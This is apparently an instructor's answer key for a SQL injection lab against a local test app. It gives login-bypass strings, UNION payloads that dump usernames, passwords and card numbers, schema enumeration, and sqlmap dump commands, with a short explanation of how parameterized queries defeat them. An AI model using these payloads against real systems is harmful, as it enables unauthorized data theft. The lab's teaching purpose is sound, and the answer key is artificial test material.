# Instructor Notes & Answer Key — Week 5 SQLi Lab

> خاص بالـ TA. فيه الحلول الجاهزة لكل خطوة + verified payloads.
> All payloads below were tested against this app and work.

## Seeded data (what students are after)

Users table (`users`): `id, username, password, email, is_admin, credit_card`

| username | password | is_admin | credit_card |
|---|---|---|---|
| admin | S3cr3t_Adm1n! | 1 | 4111-1111-1111-1111 |
| alice | alice1990 | 0 | 5500-0000-0000-0004 |
| bob | qwerty | 0 | 3400-0000-0000-009 |
| charlie | P@ssw0rd123 | 0 | 6011-0000-0000-0004 |

## Login bypass (POST /login)

username field, any password:

```
admin'--
```

or:

```
' OR '1'='1
```

## UNION on /products?search= (string, 4 columns)

Column count:

```
zzz' ORDER BY 4--      (OK)
zzz' ORDER BY 5--      (error -> 4 columns)
```

Visible columns:

```
zzz' UNION SELECT 1,2,3,4-- 
```

Dump users:

```
zzz' UNION SELECT id, username, password, is_admin FROM users-- 
```

SQLite version:

```
zzz' UNION SELECT 1, sqlite_version(), 3, 4-- 
```

List tables:

```
zzz' UNION SELECT 1, name, sql, 4 FROM sqlite_master WHERE type='table'-- 
```

## UNION on /product?id= (numeric, no quotes)

```
0 UNION SELECT id, username, password, credit_card FROM users-- 
```

URL-encoded for the browser:

```
http://localhost:3000/product?id=0%20UNION%20SELECT%20id,username,password,credit_card%20FROM%20users--%20
```

## Exercise solutions

**1) admin email only:**

```
zzz' UNION SELECT 1, email, 3, 4 FROM users WHERE username='admin'-- 
```

**2) all table names:**

```
zzz' UNION SELECT 1, group_concat(name), 3, 4 FROM sqlite_master WHERE type='table'-- 
```
(returns `users,products`)

**3) third bypass variant:**

```
nonexistent' OR 1=1 LIMIT 1 OFFSET 0-- 
```

**4) sqlmap on login:**

```bash
sqlmap -u "http://localhost:3000/login" --data="username=admin&password=admin" -p username --batch --dump -T users
```

**5) SECURE mode proof:** parameterized queries send the payload as a *bound value*, not SQL text, so `admin'--` becomes a literal username lookup that matches nobody, and the UNION string is searched for literally inside product names -> no rows. The `?` placeholder is why: the driver never parses user input as SQL.

## Quick sqlmap crib for the board

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch              # detect
sqlmap -u "http://localhost:3000/product?id=1" --batch --dbs        # databases
sqlmap -u "http://localhost:3000/product?id=1" --batch --tables     # tables
sqlmap -u "http://localhost:3000/product?id=1" --batch -T users --dump   # dump
```

## Teardown

In-memory DB resets on every restart. If a port is stuck:

```powershell
Get-CimInstance Win32_Process -Filter "Name='node.exe'" |
  Where-Object { $_.CommandLine -like '*server.js*' } |
  ForEach-Object { Stop-Process -Id $_.ProcessId -Force }
```
